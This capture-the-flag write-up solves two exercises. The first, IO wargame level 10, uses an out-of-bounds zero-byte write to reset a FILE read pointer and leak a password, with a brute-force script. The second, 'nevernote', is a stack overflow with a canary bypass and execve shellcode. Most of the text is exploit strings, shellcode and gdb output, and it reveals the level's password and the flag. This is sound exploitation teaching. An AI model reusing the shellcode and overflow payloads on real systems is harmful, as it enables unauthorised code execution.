# IO Level 10

## Problem
This problem has a fairly small code.
````
//written by andersonc0d3
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv){
        FILE *fp = fopen("/levels/level10_alt.pass", "r");
        struct {char pass[20], msg_err[20]} pwfile = {{0}};
        char ptr[0];

        if(!fp || argc != 2)
                return -1;

        fread(pwfile.pass, 1, 20, fp);
    pwfile.pass[19] = 0;
        ptr[atoi(argv[1])] = 0;
        fread(pwfile.msg_err, 1, 19, fp);
        fclose(fp);

        if(!strcmp(pwfile.pass, argv[1]))
                execl("/bin/sh", "sh", 0);
        else
                puts(pwfile.msg_err);


        return 0;
}
````

## Writeup

This program opens a "secret" file and reads the password. It also takes a command line argument and compares it with the password that is read. If they both match, a shell is 
given. However, there is no access to read the password file directly as it is set to elevated permission. 
The program also reads the next few bytes from the same file which is supposed to be the "error message". If the passwords dont match, the program then prints out the error message.
Also, there is a statement `ptr[atoi(argv[1])] = 0;` which sets the byte at (ptr + argv[1]) to zero. This is done after the first read from the password file. 

At this point, one can figure out that since there are reads happening on the same file, and this out-of-the-place statement is setting a byte to zero and dependant on the 
command line argument, there is a way to reset the read pointer of the file. If the pointer is reset, when there is a second read into the `msg_err` buffer, it reads the password
instead of the error message.

On opening this binary in gdb, and examining the structure of `FILE`:

````
(gdb) p *fp
$27 = {_flags = -72539000, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0,
  _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0xb7fcf580, _fileno = 7, _flags2 = 0, _old_offset = 0, _cur_column = 0,
  _vtable_offset = 0 '\000', _shortbuf = "", _lock = 0x804a0a0, _offset = -1, __pad1 = 0x0, __pad2 = 0x804a0ac, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0, _mode = 0,
  _unused2 = '\000' <repeats 39 times>}
(gdb)
````

There is a pointer called `_IO_read_ptr` which is initially 0.
This program cant be debugged directly in gdb because opening this in gdb would render the elevated password file inaccessible. One way is to compile this binary at a temporary
location and creating a password file on our own. On running the gdb on the temporary program and checking the `FILE` fter doing the read,

````
(gdb) p *fp
$28 = {_flags = -72539000, _IO_read_ptr = 0xb7fde014 "aaaaaaaaaabbbbbbbbbb\n", _IO_read_end = 0xb7fde029 "", _IO_read_base = 0xb7fde000 "01234567890123456789aaaaaaaaaabbbbbbbbbb\n",
  _IO_write_base = 0xb7fde000 "01234567890123456789aaaaaaaaaabbbbbbbbbb\n", _IO_write_ptr = 0xb7fde000 "01234567890123456789aaaaaaaaaabbbbbbbbbb\n",
  _IO_write_end = 0xb7fde000 "01234567890123456789aaaaaaaaaabbbbbbbbbb\n", _IO_buf_base = 0xb7fde000 "01234567890123456789aaaaaaaaaabbbbbbbbbb\n",
  _IO_buf_end = 0xb7fdf000 "d\360\375\267\323\300\377\267", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0xb7fcf580, _fileno = 7, _flags2 = 0,
  _old_offset = 0, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "", _lock = 0x804a0a0, _offset = -1, __pad1 = 0x0, __pad2 = 0x804a0ac, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0,
  _mode = -1, _unused2 = '\000' <repeats 39 times>}
(gdb)
````

Note that the _IO_read_ptr is now pointing to the location after the password is read and this has to be reset to the beginning. On printing the address of this pointer in memory
and the address of `ptr` variable which allows us to set an "arbitrary" byte to 0
````
p &fp._IO_read_ptr
$29 = (char **) 0x804a00c
p &ptr
$30 = (char (*)[]) 0xbffffc74
````
So the difference would be 
````
p (int)&ptr - (int)&fp._IO_read_ptr
$31 = -1208263576
```` 

So if I pass 1208263576 as the argument, it sets the first byte of value pointed to by fp._IO_read_ptr to 0. Since there were only 20 bytes read, setting the first byte to zero 
would reset the pointer. However, it wont set the required byte to zero adn fread still reads the "error message" into the `msg_err` buffer.

Note that the address of pointer `ptr` depends on the length of command line argument since the command line argument is stored on the stack. On performing the same calculations with
the new argument obtained above (1208263576)

````
p (int)&ptr - (int)&fp._IO_read_ptr
$40 = -1208263592
````

Thus the new argument is 1208263592. This argument resets the read pointer and causes the password to be printed out as error message.

However, on running this on the original binary, the offsets vary. One method is to brute force the program with different values around the values obtained in gdb. The 
python script described below does that.

````
#!/usr/bin/env python
import subprocess
import sys

start = 1208260000
end = 1208270000
for i in range(start, end):
    try:
        output = subprocess.check_output(["/levels//level10", str(i)], stderr=None)
    except Exception:
        continue
    if output.find("ACCESS") == -1:
        print i
````

This find the value to be "1208263612". Hence on running,
` /levels/level10 1208263612`
the password that is supposed to be input is obtained.
"AverYloNgPassword!!"
This is then passed to the binary using
`/levels/level10 `python -c 'print "AverYloNgPassword!!"'`
and the shell is obtained.


Nevernote.c runs a main command loop which takes various arguments and adds a new note, views an existing note, etc
````
    while (true){
        printf("Enter a command: ");
        fflush(stdout);
        if (fgets(command, 16, stdin) == NULL) goto exit;

        switch (command[0]){
            case 'a':
            case 'A':
                add_note(note_file_path);
                break;
            case 'v':
            case 'V':
                view_notes(note_file_path);
                break;
            case 'q':
            case 'Q':
                goto exit;
            default:
                puts("Commands: [a]dd_note, [v]iew_notes, [q]uit");
                fflush(stdout);
                break;
        }
    }
````
The note_file_path appends the name entered to this path **"/home/nevernote/notes/"**. This variable is malloced and is on the heap.
There was nothing "interesting" so far since 64 bytes name is read via `fgets`.

I later moved to the next function add_note
	`char *new_note = (char *)malloc(NOTE_SIZE);`
It is creating a buffer of NOTE_SIZE (1024 bytes) and passing that to get_note. That function is probably used to get the contents of the note.
add_note function is then checking the return status of get_note, and if successful, creates a file and writes the buffer to that file.

I then move on to get_note function hoping that this was the place where the magic was.
get_note function looked interesting at the first glance as it had the calls to create and verify canaries in the beginning and the end.

````
bool get_note(char *dest){
    struct safe_buffer temporary;
    bool valid;

    get_canary(&temporary.can);

    printf("Write your note: ");
    fflush(stdout);
    fgets(temporary.buf, NOTE_SIZE, stdin);

    // disallow some characters
    if (strchr(temporary.buf, '\t') || strchr(temporary.buf, '\r')){
        valid = false;
    }else{
        valid = true;
        strncpy(dest, temporary.buf, NOTE_SIZE);
    }

    verify_canary(&temporary.can);

    return valid;
}
````

It was using a safe_buffer structure to take the input. It even used proper NOTE_SIZE both while getting the input from stdin and while copying it to the buffer passed to it.
Everything looked fine till I checked how the structure safe_buffer is declared in canary.h

It had a char buffer and a varible of struct canary type. The most interesting line in the header file was this
`#define SAFE_BUFFER_SIZE 512`

The size of the buffer in safe buf was 512 bytes.
But get_note function copied NOTE_SIZE bytes into a safe_buffer.

**Buffer Overflow detected!!!!!**

I created compiled my own copy of nevernote from the source and ran it in gdb and examined the contents of the stack. I gave 512 bytes of input, exactly the size of the buffer
in the safe_buffer.

The command I used in gdb to run the program was
`r < <(python -c 'print "name\n" + "a\n" + "a"*512')`
where each '\n' sends input to the binary as if it is typed on console. Hence when the binary first asks for name, the input sent is "name\n", and the operation is "a\n" which is 
add and then I send 512 bytes of "a".

Before running this, I put a breakpoint just before call to strncpy by checking its address.
`b *0x08048910`

When the control hits the break point, I check the stack.
`x/32xw $esp`
I find the arguments as expected. I check the end of the buffer and then right after the buffer, there are the remaining fields of the safe_buffer type which are 
````
struct canary{
    int canary;
    int *verify;
};
````

these two values. I am assuming that get_canary function somehow gets the canary (it is using /dev/urandom) and sets it.
I verify this by 
`x temporary.can.canary` and it shows me
*0x924e000a:     Cannot access memory at address 0x924e000a*
which is the value on the stack at temporary.can.canary location. Also the next 4 bytes is a pointer on the heap which is supposed to point to canary and it contained 0x924ea41f

````
0xffffd5e0:     0x61616161      0x924e000a      0x0804c458      0x01e7f44e
0xffffd5f0:     0xf7e91f47      0xf7fc7000      0xffffd628      0x0804894e
0xffffd600:     0x0804c050      0xf7fc7000      0xf7fc7ac0      0xf7e7f10c
0xffffd610:     0xf7fc7ac0      0x08048da2      0xffffd634      0x0804c050
0xffffd620:     0x00000000      0x00000000      0xffffd6a8      0x08048bae
0xffffd630:     0x0804c008      0x00000010      0xf7fc7c20      0xf7ffd55c
0xffffd640:     0xffffd568      0xffffd588      0x00000000      0x00000a61
0xffffd650:     0x00000000      0x00000001      0x000001a8      0xf7000061
(gdb) x 0x0804c458
0x804c458:      0x924ea41f
````

There was something different because the verify was supposed to point to canary and as i continued, I got 
**Canary was incorrect!**
**Buffer overflow detected! Exiting.**
which was a good thing.

(Later I reliased that the \n and \0 characters had overwritten the first two bytes of the canary.)

Now all I needed was to give an input so that the verify always points to the canary. Now the HINT comes to the rescue.
Think about what fields of the canary struct you control. Also, malloc() is predictable without ASLR.

Since there is no ASLR, the pointer verify would always be malloced at address 0x0804c050. Hence I hard coded it into the exploit string. Also now is used '\90' instead of 'a'.
Also I check where the return address is stored and owerwrite that with a location inside the buffer. My exploit string so far is 

`r < <(python -c 'print "a\n" + "a\n" + "\x90"*516 + "\x50\xc0\x04\x08" + "a"*16 + "\xbc\xd6\xff\xff"')

Now I get a segfault after strncpy. I put a break point just before that and check the arguments I am passing to it. I have basically overwritten it with my buffer's \n\0 characters.
I could have reduced two bytes from my buffer but since my plan was to return to a value near the beginning of the buffer, I hard-coded the value being overwritten.

Ran gdb again
`r < <(python -c 'print "a\n" + "a\n" + "\x90"*516 + "\x50\xc0\x04\x08" + "a"*16 + "\xbc\xd6\xff\xff" + "\x50\xc0\x04\x08"')`. 
Now the verify_canary check passed and the function get_note returned to my return address. Now time to do some shell coding.

I took the tried and tested 28 byte execve(/bin/sh) code and inserted it. Since there were other function calls after the buffer overflow, I had to be careful not to corrupt the
stack. I decided to return above the return address instead (since I had 1024 bytes). Also gdb adds its own environment variables and even after unsetting them, I wasnt able to 
get the return address right. So I added a 200 byte NOP sled and then my shell code.

My final exploit string (after taking into consideration the STDIN closing issue) was
````
(echo "a"; echo "a"; python -c 'print "\x90\x90\x90\x90" + "\x90"*489 + "\x90"*23 + "\x50\xc0\x04\x08" + "a"*16 + "\xbc\xd6\xff\xff" + "\x50\xc0\x04\x08" + "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') > /tmp/aaa

(cat /tmp/aaa; cat) | ./nevernote
````

**FLAG: the_hairy_canary_fairy_is_still_very_wary**

